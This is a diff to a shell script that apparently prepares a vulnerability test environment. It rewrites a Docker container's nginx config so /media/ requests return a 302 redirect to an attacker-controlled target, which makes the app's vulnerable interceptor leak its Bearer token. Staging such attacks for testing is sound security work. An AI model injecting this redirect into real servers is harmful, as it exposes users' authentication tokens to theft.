@@ -172,15 +172,18 @@ info "SharedPreferences planted (uid=${APP_UID:-unknown})"
 # This simulates an "auth'd uploader sets external cover URL" attack: every
 # cover-art fetch the app makes ends up going to the attacker.  The vulnerable
 # NetworkInterceptor attaches the Bearer token on the redirected request.
+#
+# We replace the single `alias` line inside the existing `location /media/`
+# block with `return 302 <attacker>`.  This is much more robust than
+# c-replacing the whole block (which depends on exact brace placement).
 info "Injecting nginx redirect: /media/* → ${REDIRECT_TARGET}"
 docker exec front sh -c "
-    cat > /etc/nginx/conf.d/cover_redirect.conf <<'NGINX'
-# Injected by vuln_1 prepare_app.sh — redirects cover-art fetches to attacker.
-NGINX
-    sed -i '/location \/media\//,/}/ c\\
-    location /media/ {\\
-        return 302 ${REDIRECT_TARGET};\\
-    }' /etc/nginx/conf.d/default.conf && nginx -s reload
+    set -e
+    sed -i.bak 's|alias /srv/funkwhale/data/media/;|return 302 ${REDIRECT_TARGET};|' \
+        /etc/nginx/conf.d/default.conf
+    grep -q 'return 302 ${REDIRECT_TARGET};' /etc/nginx/conf.d/default.conf
+    nginx -t
+    nginx -s reload
 " >/dev/null || fatal "Failed to inject nginx redirect"
 
 # Sanity-check the redirect is in place
